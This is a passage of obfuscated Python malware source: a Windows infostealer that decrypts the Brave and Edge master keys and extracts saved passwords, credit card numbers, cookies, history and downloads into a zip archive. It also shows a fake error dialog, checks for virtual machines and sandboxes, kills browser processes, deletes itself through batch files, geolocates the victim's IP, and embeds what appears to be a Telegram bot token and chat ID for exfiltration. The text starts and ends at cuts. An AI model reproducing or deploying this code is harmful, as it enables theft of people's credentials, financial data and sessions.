rom Crypto import Random
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
import os, sys, json, subprocess, tempfile
import base64, ctypes, wmi, psutil, shutil, sqlite3, platform, requests, hashlib, threading

yQqWqpbrSU = '0JE3ZjHkfyV94eIhyT8o0Xf4rzB5r1'

class NSgV04jaOX(object):
    def __init__(self, UY51Asc8iS):
        self.bs = AES.block_size
        self.UY51Asc8iS = hashlib.sha256(UY51Asc8iS.encode()).digest()
    def kLgIo(self, cqQ0zvu61B):
        cqQ0zvu61B = base64.b64decode(cqQ0zvu61B)
        eQxLU1Z2H3 = cqQ0zvu61B[:AES.block_size]
        MPIxEwY228 = AES.new(self.UY51Asc8iS, AES.MODE_CFB, eQxLU1Z2H3)
        return self._unpad(MPIxEwY228.decrypt(cqQ0zvu61B[AES.block_size:])).decode('utf-8')
    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]

# START
def bW232(hc1H3S04Hq):
    return ''.join(chr(int(E3R23MtO6x[2:], 16)) for E3R23MtO6x in hc1H3S04Hq[::-1])

global o53C6u5jyC
if bW232(['/x78', '/x75', '/x6e', '/x69', '/x4c']) in platform.uname(): o53C6u5jyC = bW232(['/x78', '/x75', '/x6e', '/x69', '/x6c'])
else:
    import winreg
    o53C6u5jyC = bW232(['/x73', '/x77', '/x6f', '/x64', '/x6e', '/x69', '/x77'])

Y47a4w39Mu = 0
u389S1mQSh = os.path.expanduser("~")
uJ858WIium = os.getenv('LOCALAPPDATA')

z7kYo0IOA8 = {
    bW232(['/x65', '/x76', '/x61', '/x72', '/x62']):  f"{uJ858WIium}\\{bW232(['/x65', '/x72', '/x61', '/x77', '/x74', '/x66', '/x6f', '/x53', '/x65', '/x76', '/x61', '/x72', '/x42'])}\\{bW232(['/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42', '/x2d', '/x65', '/x76', '/x61', '/x72', '/x42'])}\\{bW232(['/x61', '/x74', '/x61', '/x44', '/x20', '/x72', '/x65', '/x73', '/x55'])}",
    bW232(['/x65', '/x67', '/x64', '/x65']): f"{uJ858WIium}\\{bW232(['/x74', '/x66', '/x6f', '/x73', '/x6f', '/x72', '/x63', '/x69', '/x4d'])}\\{bW232(['/x65', '/x67', '/x64', '/x45'])}\\{bW232(['/x61', '/x74', '/x61', '/x44', '/x20', '/x72', '/x65', '/x73', '/x55'])}",
}

def pDqGx(f8kiF76h2Y=bW232(['/x2e', '/x64', '/x6e', '/x75', '/x6f', '/x66', '/x20', '/x74', '/x6f', '/x6e', '/x20', '/x73', '/x61', '/x77', '/x20', '/x65', '/x6c', '/x69', '/x66', '/x20', '/x4c', '/x4c', '/x44', '/x20', '/x65', '/x68', '/x74', '/x20', '/x65', '/x73', '/x75', '/x61', '/x63', '/x65', '/x62', '/x20', '/x74', '/x72', '/x61', '/x74', '/x73', '/x20', '/x6f', '/x74', '/x20', '/x64', '/x65', '/x6c', '/x69', '/x61', '/x66', '/x20', '/x6e', '/x6f', '/x69', '/x74', '/x61', '/x63', '/x69', '/x6c', '/x70', '/x70', '/x61', '/x20', '/x73', '/x69', '/x68', '/x54'])):
    ctypes.windll.user32.MessageBoxW(0, f8kiF76h2Y, "System Error", 0x10)
def zY906(h52wtuT2BG):
    try:
        Yef9Ux497r = int(h52wtuT2BG)
        z1iP1OHJh8 = (Yef9Ux497r - 11644473600000000) / 1000000
        return int(z1iP1OHJh8)
    except: return 0
def qR7v5(qiZk3W91EI: str):
    if not os.path.exists(qiZk3W91EI): return
    if 'os_crypt' not in open(qiZk3W91EI + "\\Local State", 'r', encoding='utf-8').read(): return
    with open(qiZk3W91EI + "\\Local State", "r", encoding="utf-8") as f: c = f.read()
    uI6I101aJH = json.loads(c)
    x58RZt68LO = base64.b64decode(uI6I101aJH["os_crypt"]["encrypted_key"])
    x58RZt68LO = x58RZt68LO[5:]
    x58RZt68LO = CryptUnprotectData(x58RZt68LO, None, None, None, 0)[1]
    return x58RZt68LO
def Ir033(LBlW54n5io: bytes, H551qRRT6q: bytes) -> str:
    cR6b51N6pr = LBlW54n5io[3:15]
    w4GGr27W9l = LBlW54n5io[15:]
    yxX48kzk8L = AES.new(H551qRRT6q, AES.MODE_GCM, cR6b51N6pr)
    ZxRqk755kB = yxX48kzk8L.decrypt(w4GGr27W9l)
    ZxRqk755kB = ZxRqk755kB[:-16].decode()
    return ZxRqk755kB

def gT126(su3K20YApY, wYt489jo07, ioQfF96P0h, brD44z2Kz1):
    global Y47a4w39Mu
    if not os.path.exists(f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}'):
        os.mkdir(f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}')
    if not os.path.exists(f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}\\{su3K20YApY}'):
        os.mkdir(f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}\\{su3K20YApY}')
    if ioQfF96P0h is not None:
        open(f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}\\{su3K20YApY}\\{wYt489jo07}.txt', 'w', encoding="utf-8").write(ioQfF96P0h)
    Y47a4w39Mu += 1
def i1I50(lPP95xI1g5: str, vY984NutdV: str, SscKf453Z1):
    HK3f2kVK8e = f'{lPP95xI1g5}\\{vY984NutdV}\\Login Data'
    if not os.path.exists(HK3f2kVK8e):
        return "", 0
    ZTTFB15r5f = ""
    SR8M0C4qIi = 0
    shutil.copy(HK3f2kVK8e, f'{u389S1mQSh}\\AppData\\Local\\Temp\\login_db')
    v6dRgRAi19 = sqlite3.connect(f'{u389S1mQSh}\\AppData\\Local\\Temp\\login_db')
    ah2N20y897 = v6dRgRAi19.cursor()
    ah2N20y897.execute(bW232(['/x73', '/x6e', '/x69', '/x67', '/x6f', '/x6c', '/x20', '/x4d', '/x4f', '/x52', '/x46', '/x20', '/x65', '/x75', '/x6c', '/x61', '/x76', '/x5f', '/x64', '/x72', '/x6f', '/x77', '/x73', '/x73', '/x61', '/x70', '/x20', '/x2c', '/x65', '/x75', '/x6c', '/x61', '/x76', '/x5f', '/x65', '/x6d', '/x61', '/x6e', '/x72', '/x65', '/x73', '/x75', '/x20', '/x2c', '/x6c', '/x72', '/x75', '/x5f', '/x6e', '/x6f', '/x69', '/x74', '/x63', '/x61', '/x20', '/x54', '/x43', '/x45', '/x4c', '/x45', '/x53']))
    for TeHB6EU22I in ah2N20y897.fetchall():
        S0hT9qJG0I = Ir033(TeHB6EU22I[2], SscKf453Z1)
        if S0hT9qJG0I:
            ZTTFB15r5f += f"""
            {bW232(['/x3a', '/x4c', '/x52', '/x55'])} {TeHB6EU22I[0]}
            {bW232(['/x3a', '/x6c', '/x69', '/x61', '/x6d', '/x45'])} {TeHB6EU22I[1]}
            {bW232(['/x3a', '/x64', '/x72', '/x6f', '/x77', '/x73', '/x73', '/x61', '/x50'])} {S0hT9qJG0I}\n
            """
            SR8M0C4qIi += 1
    
    v6dRgRAi19.close()
    os.remove(f'{u389S1mQSh}\\AppData\\Local\\Temp\\login_db')
    return ZTTFB15r5f, SR8M0C4qIi
def k76fQ(rl8F45G86B: str, vtjBhH055j: str, y3g7838RtS):
    MlQA9T07S2 = f'{rl8F45G86B}\\{vtjBhH055j}\\Web Data'
    if not os.path.exists(MlQA9T07S2): return "", 0
    XH7pai4f17 = ""
    e33Dlj2DPb = 0
    shutil.copy(MlQA9T07S2, f'{u389S1mQSh}\\AppData\\Local\\Temp\\cards_db')
    iMP8V6MN06 = sqlite3.connect(f'{u389S1mQSh}\\AppData\\Local\\Temp\\cards_db')
    E117pu6ZQe = iMP8V6MN06.cursor()
    E117pu6ZQe.execute(bW232(['/x73', '/x64', '/x72', '/x61', '/x63', '/x5f', '/x74', '/x69', '/x64', '/x65', '/x72', '/x63', '/x20', '/x4d', '/x4f', '/x52', '/x46', '/x20', '/x64', '/x65', '/x69', '/x66', '/x69', '/x64', '/x6f', '/x6d', '/x5f', '/x65', '/x74', '/x61', '/x64', '/x20', '/x2c', '/x64', '/x65', '/x74', '/x70', '/x79', '/x72', '/x63', '/x6e', '/x65', '/x5f', '/x72', '/x65', '/x62', '/x6d', '/x75', '/x6e', '/x5f', '/x64', '/x72', '/x61', '/x63', '/x20', '/x2c', '/x72', '/x61', '/x65', '/x79', '/x5f', '/x6e', '/x6f', '/x69', '/x74', '/x61', '/x72', '/x69', '/x70', '/x78', '/x65', '/x20', '/x2c', '/x68', '/x74', '/x6e', '/x6f', '/x6d', '/x5f', '/x6e', '/x6f', '/x69', '/x74', '/x61', '/x72', '/x69', '/x70', '/x78', '/x65', '/x20', '/x2c', '/x64', '/x72', '/x61', '/x63', '/x5f', '/x6e', '/x6f', '/x5f', '/x65', '/x6d', '/x61', '/x6e', '/x20', '/x54', '/x43', '/x45', '/x4c', '/x45', '/x53']))
    for Hk50ApP415 in E117pu6ZQe.fetchall():
        if all(Hk50ApP415[:4]):
            X7U40c2h4T = Ir033(Hk50ApP415[3], y3g7838RtS)
            if X7U40c2h4T:
                XH7pai4f17 += f"""
                {bW232(['/x3a', '/x64', '/x72', '/x61', '/x43', '/x20', '/x65', '/x6d', '/x61', '/x4e'])} {Hk50ApP415[0]}
                {bW232(['/x3a', '/x72', '/x65', '/x62', '/x6d', '/x75', '/x4e', '/x20', '/x64', '/x72', '/x61', '/x43'])} {X7U40c2h4T}
                {bW232(['/x3a', '/x73', '/x65', '/x72', '/x69', '/x70', '/x78', '/x45'])}  {Hk50ApP415[1]} / {Hk50ApP415[2]}
                {bW232(['/x3a', '/x64', '/x65', '/x64', '/x64', '/x41'])} {datetime.fromtimestamp(Hk50ApP415[4])}\n"""
                e33Dlj2DPb += 1
    iMP8V6MN06.close()
    os.remove(f'{u389S1mQSh}\\AppData\\Local\\Temp\\cards_db')
    return XH7pai4f17, e33Dlj2DPb

def L06p9(pxvDV55Bn2: str, aWj851zGgM: str, nGM4z193Ad):
    U3X9q2zSZK = f'{pxvDV55Bn2}\\{aWj851zGgM}\\Network\\Cookies'
    if not os.path.exists(U3X9q2zSZK): return "", 0 
    V7vKAbn78O = {}
    GJJHkl816J = 0
    hO6tno27cZ = os.path.join(os.getenv('APPDATA'), 'Local', 'Temp')
    os.makedirs(hO6tno27cZ, exist_ok=True)
    shutil.copy(U3X9q2zSZK, os.path.join(hO6tno27cZ, 'cookie_db'))
    Aapsa29J3t = sqlite3.connect(os.path.join(hO6tno27cZ, 'cookie_db'))
    sEbsM6R087 = Aapsa29J3t.cursor()
    sEbsM6R087.execute(bW232(['/x73', '/x65', '/x69', '/x6b', '/x6f', '/x6f', '/x63', '/x20', '/x4d', '/x4f', '/x52', '/x46', '/x20', '/x63', '/x74', '/x75', '/x5f', '/x73', '/x65', '/x72', '/x69', '/x70', '/x78', '/x65', '/x20', '/x2c', '/x65', '/x75', '/x6c', '/x61', '/x76', '/x5f', '/x64', '/x65', '/x74', '/x70', '/x79', '/x72', '/x63', '/x6e', '/x65', '/x20', '/x2c', '/x68', '/x74', '/x61', '/x70', '/x20', '/x2c', '/x65', '/x6d', '/x61', '/x6e', '/x20', '/x2c', '/x79', '/x65', '/x6b', '/x5f', '/x74', '/x73', '/x6f', '/x68', '/x20', '/x54', '/x43', '/x45', '/x4c', '/x45', '/x53']))
    for aR0Ff8S9i5 in sEbsM6R087.fetchall():
        if all(aR0Ff8S9i5[:4]):
            DD80ui67oj = aR0Ff8S9i5[0]
            PE199pmN6b = aR0Ff8S9i5[1]
            DYI2i109B9 = aR0Ff8S9i5[2]
            zT84305294 = Ir033(aR0Ff8S9i5[3], nGM4z193Ad)
            yN4UJ5BZv8 = zY906(aR0Ff8S9i5[4])       
            wSj4S20T56 = (DD80ui67oj, DYI2i109B9)
            if zT84305294:
                if wSj4S20T56 not in V7vKAbn78O:
                    V7vKAbn78O[wSj4S20T56] = []
                n4wc0J2ZsX = f"{DD80ui67oj}\tFALSE\t{DYI2i109B9}\tTRUE\t{yN4UJ5BZv8}\t{PE199pmN6b}\t{zT84305294}"
                V7vKAbn78O[wSj4S20T56].append(n4wc0J2ZsX)
                GJJHkl816J += 1
    Aapsa29J3t.close()
    os.remove(os.path.join(hO6tno27cZ, 'cookie_db'))   
    iG5W1v1X1u = ''
    for wSj4S20T56, Q8xCw3s9cy in V7vKAbn78O.items():
        iG5W1v1X1u += '\n'.join(Q8xCw3s9cy) + '\n\n'  
    return iG5W1v1X1u, GJJHkl816J
def F8z62(oY53D16xQw: str, d2uVV12dsR: str):
    tON12J4Je3 = f'{oY53D16xQw}\\{d2uVV12dsR}\\History'
    if not os.path.exists(tON12J4Je3): return "", 0
    U874xMZMDs = ""
    q2XQ1SK6iE = 0
    shutil.copy(tON12J4Je3, f'{u389S1mQSh}\\AppData\\Local\\Temp\\web_history_db')
    qLl53qPtp3 = sqlite3.connect(f'{u389S1mQSh}\\AppData\\Local\\Temp\\web_history_db')
    EopFc34373 = qLl53qPtp3.cursor()
    EopFc34373.execute(bW232(['/x73', '/x6c', '/x72', '/x75', '/x20', '/x4d', '/x4f', '/x52', '/x46', '/x20', '/x65', '/x6d', '/x69', '/x74', '/x5f', '/x74', '/x69', '/x73', '/x69', '/x76', '/x5f', '/x74', '/x73', '/x61', '/x6c', '/x20', '/x2c', '/x65', '/x6c', '/x74', '/x69', '/x74', '/x20', '/x2c', '/x6c', '/x72', '/x75', '/x20', '/x54', '/x43', '/x45', '/x4c', '/x45', '/x53']))
    for ik9GNi00Pl in EopFc34373.fetchall():
        if all(ik9GNi00Pl[:3]):
            U874xMZMDs += f"""
            {bW232(['/x3a', '/x4c', '/x52', '/x55'])} {ik9GNi00Pl[0]}
            {bW232(['/x3a', '/x65', '/x6c', '/x74', '/x69', '/x54'])} {ik9GNi00Pl[1]}
            {bW232(['/x3a', '/x65', '/x6d', '/x69', '/x54', '/x20', '/x64', '/x65', '/x74', '/x69', '/x73', '/x69', '/x56'])} {ik9GNi00Pl[2]}\n"""
            q2XQ1SK6iE += 1
    qLl53qPtp3.close()
    os.remove(f'{u389S1mQSh}\\AppData\\Local\\Temp\\web_history_db')
    return U874xMZMDs, q2XQ1SK6iE
def aC92t(srgzA0T807: str, Y37kXJn5yZ: str):
    vx81GUPXd0 = f'{srgzA0T807}\\{Y37kXJn5yZ}\\History'
    if not os.path.exists(vx81GUPXd0): return "", 0
    StKM97AT9f = ""
    cM8gt0qi8I = 0    
    shutil.copy(vx81GUPXd0, u389S1mQSh+'\\AppData\\Local\\Temp\\downloads_db')
    gX9e4V1XYN = sqlite3.connect(u389S1mQSh+'\\AppData\\Local\\Temp\\downloads_db')
    sXm98lZ7R7 = gX9e4V1XYN.cursor()
    sXm98lZ7R7.execute(bW232(['/x73', '/x64', '/x61', '/x6f', '/x6c', '/x6e', '/x77', '/x6f', '/x64', '/x20', '/x4d', '/x4f', '/x52', '/x46', '/x20', '/x68', '/x74', '/x61', '/x70', '/x5f', '/x74', '/x65', '/x67', '/x72', '/x61', '/x74', '/x20', '/x2c', '/x6c', '/x72', '/x75', '/x5f', '/x62', '/x61', '/x74', '/x20', '/x54', '/x43', '/x45', '/x4c', '/x45', '/x53']))
    for QxL5746Z7u in sXm98lZ7R7.fetchall():
        if all(QxL5746Z7u[:2]):
            StKM97AT9f += f"""
            {bW232(['/x3a', '/x4c', '/x52', '/x55', '/x20', '/x64', '/x61', '/x6f', '/x6c', '/x6e', '/x77', '/x6f', '/x44'])} {QxL5746Z7u[0]}
            {bW232(['/x3a', '/x68', '/x74', '/x61', '/x50', '/x20', '/x6c', '/x61', '/x63', '/x6f', '/x4c'])} {QxL5746Z7u[1]}\n"""
            cM8gt0qi8I += 1
    gX9e4V1XYN.close()
    os.remove(f'{u389S1mQSh}\\AppData\\Local\\Temp\\downloads_db')
    return StKM97AT9f, cM8gt0qi8I

def pH064():
    T87uFT21rM = []
    for d0Z8f8Q2vM, gzbeB77uq8 in z7kYo0IOA8.items():
        if os.path.exists(gzbeB77uq8):
            T87uFT21rM.append(d0Z8f8Q2vM)
    return T87uFT21rM

def fF964(brD44z2Kz1):
    qP3Ywx83HJ = pH064()
    bBQ8t03XjH = {bW232(['/x73', '/x64', '/x72', '/x6f', '/x77', '/x73', '/x73', '/x61', '/x50', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']): 0, bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']): 0, bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x64', '/x61', '/x6f', '/x6c', '/x6e', '/x77', '/x6f', '/x44']): 0, bW232(['/x73', '/x65', '/x69', '/x6b', '/x6f', '/x6f', '/x43', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']): 0, bW232(['/x73', '/x64', '/x72', '/x61', '/x43', '/x5f', '/x74', '/x69', '/x64', '/x65', '/x72', '/x43', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']): 0}
    for tH194B6Jh9 in qP3Ywx83HJ:
        GBBL6w39dJ = z7kYo0IOA8[tH194B6Jh9]
        ttmlF35SQ9 = qR7v5(GBBL6w39dJ)
        jTB4Ii52V4, ojrZ2lt085 = i1I50(GBBL6w39dJ, "Default", ttmlF35SQ9)
        gT126(tH194B6Jh9, bW232(['/x73', '/x64', '/x72', '/x6f', '/x77', '/x73', '/x73', '/x61', '/x50', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']), jTB4Ii52V4, brD44z2Kz1)
        xT531(bBQ8t03XjH, bW232(['/x73', '/x64', '/x72', '/x6f', '/x77', '/x73', '/x73', '/x61', '/x50', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']), ojrZ2lt085)
        WN8p8G1p5E, b4yOBB28j0 = F8z62(GBBL6w39dJ, "Default")
        gT126(tH194B6Jh9, bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']), WN8p8G1p5E, brD44z2Kz1)
        xT531(bBQ8t03XjH, bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']), b4yOBB28j0)
        jBCg08S3X3, CAu5Gm64OI = aC92t(GBBL6w39dJ, "Default")
        gT126(tH194B6Jh9, bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x64', '/x61', '/x6f', '/x6c', '/x6e', '/x77', '/x6f', '/x44']), jBCg08S3X3, brD44z2Kz1)
        xT531(bBQ8t03XjH, bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x64', '/x61', '/x6f', '/x6c', '/x6e', '/x77', '/x6f', '/x44']), CAu5Gm64OI)
        try:
            sMM3Q27w1w, AT2iA92CIi = L06p9(GBBL6w39dJ, "Default", ttmlF35SQ9)
            gT126(tH194B6Jh9, bW232(['/x73', '/x65', '/x69', '/x6b', '/x6f', '/x6f', '/x43', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']), sMM3Q27w1w, brD44z2Kz1)
            xT531(bBQ8t03XjH, bW232(['/x73', '/x65', '/x69', '/x6b', '/x6f', '/x6f', '/x43', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']), AT2iA92CIi)
        except PermissionError as e: continue
        kg5LwIS23y, HbZPVWu219 = k76fQ(GBBL6w39dJ, "Default", ttmlF35SQ9)
        gT126(tH194B6Jh9, bW232(['/x73', '/x64', '/x72', '/x61', '/x43', '/x5f', '/x74', '/x69', '/x64', '/x65', '/x72', '/x43', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']), kg5LwIS23y, brD44z2Kz1)
        xT531(bBQ8t03XjH, bW232(['/x73', '/x64', '/x72', '/x61', '/x43', '/x5f', '/x74', '/x69', '/x64', '/x65', '/x72', '/x43', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']), HbZPVWu219)
    shutil.make_archive(f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}', 'zip', f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}')   
    try:os.remove(f'{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}')
    except:pass
    A6A7hZu5uO = Yx918(bBQ8t03XjH)
    c4G62400m8 = f"{u389S1mQSh}\\AppData\\Local\\Temp\\{brD44z2Kz1}.zip"
    return A6A7hZu5uO, c4G62400m8

def xT531(bBQ8t03XjH, M85u79EQw4, y8kI8pW5mT):
    bBQ8t03XjH[M85u79EQw4] += y8kI8pW5mT

def Yx918(bBQ8t03XjH):
    e3EU286c7B = bBQ8t03XjH.get(bW232(['/x73', '/x65', '/x69', '/x6b', '/x6f', '/x6f', '/x43', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']), 0)
    U1kzZD3a3B = bBQ8t03XjH.get(bW232(['/x73', '/x64', '/x72', '/x6f', '/x77', '/x73', '/x73', '/x61', '/x50', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']), 0)
    ko6541Qf9e = bBQ8t03XjH.get(bW232(['/x73', '/x64', '/x72', '/x61', '/x43', '/x5f', '/x74', '/x69', '/x64', '/x65', '/x72', '/x43', '/x5f', '/x64', '/x65', '/x76', '/x61', '/x53']), 0)
    ijO94d5eq5 = bBQ8t03XjH.get(bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x72', '/x65', '/x73', '/x77', '/x6f', '/x72', '/x42']), 0)
    jRY6OclG34 = bBQ8t03XjH.get(bW232(['/x79', '/x72', '/x6f', '/x74', '/x73', '/x69', '/x48', '/x5f', '/x64', '/x61', '/x6f', '/x6c', '/x6e', '/x77', '/x6f', '/x44']), 0)
    U780rWEJQr = f"{bW232(['/x1f36a'])} {e3EU286c7B} {bW232(['/x1f511'])}  {U1kzZD3a3B}  {bW232(['/x1f4b3'])} {ko6541Qf9e}  {bW232(['/x1f4c3'])} {ijO94d5eq5}  {bW232(['/x1f4c2'])} {jRY6OclG34}"
    return U780rWEJQr

def nT644():
    C7570NXrN5 = 0
    if o53C6u5jyC == bW232(['/x73', '/x77', '/x6f', '/x64', '/x6e', '/x69', '/x77']):
        try:
            libHandle = ctypes.windll.LoadLibrary(bW232(['/x6c', '/x6c', '/x64', '/x2e', '/x6c', '/x6c', '/x44', '/x65', '/x69', '/x62', '/x53']))
            C7570NXrN5 += 1
        except: pass
        try:
            objWMI = wmi.WMI()
            for objDiskDrive in objWMI.query(f"{bW232(['/x65', '/x76', '/x69', '/x72', '/x44', '/x6b', '/x73', '/x69', '/x44', '/x5f', '/x32', '/x33', '/x6e', '/x69', '/x57', '/x20', '/x6d', '/x6f', '/x72', '/x66', '/x20', '/x2a', '/x20', '/x74', '/x63', '/x65', '/x6c', '/x65', '/x53'])}"):
                if f"{bW232(['/x78', '/x6f', '/x62', '/x76'])}" in objDiskDrive.Caption.lower() or f"{bW232(['/x6c', '/x61', '/x75', '/x74', '/x72', '/x69', '/x76'])}" in objDiskDrive.Caption.lower():
                    C7570NXrN5 += 2
            if len(objWMI.Win32_BaseBoard()[0].SerialNumber) > 25:
                C7570NXrN5 += 1
            for D89Y75Aym4 in objWMI.Win32_LogicalDisk():
                if D89Y75Aym4.size != None:
                    if (int(D89Y75Aym4.Size) / 1024 / 1024 / 1024) < 100: 
                        C7570NXrN5 += 1
            for ZOf219MF2z in objWMI.Win32_Process():
                for yI6f6ul1F4 in [bW232(['/x65', '/x78', '/x65', '/x2e', '/x64', '/x73', '/x6c', '/x6f', '/x6f', '/x74', '/x6d', '/x76']), bW232(['/x65', '/x78', '/x65', '/x2e', '/x79', '/x61', '/x72', '/x74', '/x78', '/x6f', '/x62', '/x76']), bW232(['/x65', '/x78', '/x65', '/x2e', '/x65', '/x63', '/x69', '/x76', '/x72', '/x65', '/x73', '/x78', '/x6f', '/x62', '/x76']), bW232(['/x65', '/x78', '/x65', '/x2e', '/x70', '/x6c', '/x68', '/x74', '/x63', '/x61', '/x6d', '/x76']), bW232(['/x65', '/x78', '/x65', '/x2e', '/x75', '/x6d', '/x65', '/x71', '/x6b'])]:
                    if yI6f6ul1F4 in ZOf219MF2z.Name:
                        C7570NXrN5 += 1
            if os.path.basename(sys.argv[0]) in [bW232(['/x65', '/x78', '/x65', '/x2e', '/x65', '/x6c', '/x70', '/x6d', '/x61', '/x73']), bW232(['/x65', '/x78', '/x65', '/x2e', '/x73', '/x75', '/x72', '/x69', '/x76']), bW232(['/x65', '/x78', '/x65', '/x2e', '/x65', '/x6d', '/x6e', '/x75', '/x72']), bW232(['/x65', '/x78', '/x65', '/x2e', '/x74', '/x63', '/x61', '/x66', '/x69', '/x74', '/x72', '/x61'])]:
                C7570NXrN5 += 2
        except: C7570NXrN5 += 1
        return C7570NXrN5
    else: return "nowin"

def iO365():
    Kq72b2JQ8g = psutil.process_iter()
    sKof9Y6U98 = [f"{bW232(['/x65', '/x76', '/x61', '/x72', '/x62'])}", f"{bW232(['/x78', '/x6f', '/x66', '/x65', '/x72', '/x69', '/x66'])}", f"{bW232(['/x65', '/x6d', '/x6f', '/x72', '/x68', '/x63'])}", f"{bW232(['/x65', '/x67', '/x64', '/x65'])}", f"{bW232(['/x61', '/x72', '/x65', '/x70', '/x6f'])}"]
    Dt4FALt55j = set()
    for yC81BU6a1Y in Kq72b2JQ8g:
        try:
            fN3v41EML5 = yC81BU6a1Y.name().lower()
            for kBe29J92vd in sKof9Y6U98:
                if kBe29J92vd in fN3v41EML5:
                    Dt4FALt55j.add(fN3v41EML5)
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    fu1gyA83SB = list(Dt4FALt55j)
    for h3CvVC026Y in fu1gyA83SB:
    	subprocess.Popen(f"{bW232(['/x4d', '/x49', '/x2f', '/x20', '/x46', '/x2f', '/x20', '/x4c', '/x4c', '/x49', '/x4b', '/x4b', '/x53', '/x41', '/x54'])} {h3CvVC026Y}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True).wait()


def vK127(L9nl32jEYL):
    try:
        ux5hG5UO6a = f"{base64.b64decode(bW232(['/x3d', '/x3d', '/x67', '/x49', '/x67', '/x77', '/x57', '/x5a', '/x6b', '/x70', '/x41', '/x62', '/x31', '/x35', '/x47', '/x49', '/x2b', '/x41', '/x79', '/x61', '/x68', '/x56', '/x6d', '/x63', '/x69', '/x39', '/x6d', '/x62', '/x76', '/x41', '/x69', '/x4d', '/x67', '/x51', '/x33', '/x4c', '/x67', '/x51', '/x58', '/x64', '/x76', '/x56', '/x57', '/x62', '/x70', '/x52', '/x6e', '/x43', '/x6d', '/x5a', '/x32', '/x62', '/x67', '/x38', '/x47', '/x61', '/x6a', '/x56', '/x47', '/x51']).encode()).decode()}{L9nl32jEYL}"
        with tempfile.NamedTemporaryFile(suffix=".bat", delete=False) as m6nEsDr62L:
            m6nEsDr62L.write(ux5hG5UO6a.encode())
            mrCp8523Wr = m6nEsDr62L.name 
        subprocess.Popen(mrCp8523Wr, shell=True)
    except: pass
def kVSnF(OSvcvwRItI):
    try:
        OSvcvwRItI = f'{base64.b64decode("QGVjaG8gb2ZmCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IG51bApkZWwgIg==".encode()).decode()}{OSvcvwRItI}"'
        with tempfile.NamedTemporaryFile(suffix=".bat", delete=False) as CZeqBRyurM:
            CZeqBRyurM.write(OSvcvwRItI.encode())
            lTyaTZUUxk = CZeqBRyurM.name 
        subprocess.Popen(lTyaTZUUxk, shell=True)
    except: pass

zo177AZnRH = bW232(['/x38', '/x56', '/x59', '/x70', '/x76', '/x5a', '/x5f', '/x41', '/x63', '/x39', '/x61', '/x56', '/x73', '/x30', '/x66', '/x44', '/x70', '/x74', '/x75', '/x79', '/x36', '/x74', '/x51', '/x30', '/x38', '/x74', '/x6c', '/x47', '/x54', '/x38', '/x35', '/x6f', '/x48', '/x41', '/x41', '/x3a', '/x33', '/x36', '/x38', '/x39', '/x30', '/x36', '/x35', '/x33', '/x32', '/x37'])
qm80VRl4rf = bW232(['/x38', '/x34', '/x30', '/x34', '/x30', '/x34', '/x39', '/x34', '/x30', '/x37'])

F9jWi83uzQ = False

class uF7k2FR15R(object):
    def eB619(self):
        wCbaP1L29t = requests.get(bW232(['/x67', '/x72', '/x6f', '/x2e', '/x79', '/x66', '/x69', '/x70', '/x69', '/x2e', '/x69', '/x70', '/x61', '/x2f', '/x2f', '/x3a', '/x73', '/x70', '/x74', '/x74', '/x68'])).text
        D03C77yrH9 = f"{bW232(['/x2f', '/x6f', '/x69', '/x2e', '/x6f', '/x66', '/x6e', '/x69', '/x70', '/x69', '/x2f', '/x2f', '/x3a', '/x73', '/x70', '/x74', '/x74', '/x68'])}{wCbaP1L29t}/json"
        try:
            k5c3wBL6at = requests.get(D03C77yrH9)
            if k5c3wBL6at.status_code == 200:
                cwf6vS71QO = k5c3wBL6at.json().get('country')
                if cwf6vS71QO: return {'addr': wCbaP1L29t, 'code': cwf6vS71QO}
                else: return 403
            else: return k5c3wBL6at.status_code
        except: return 500

    def lW011(self, rGO0492j2U):
        if rGO0492j2U == bW232(['/x72', '/x65', '/x73', '/x75']):
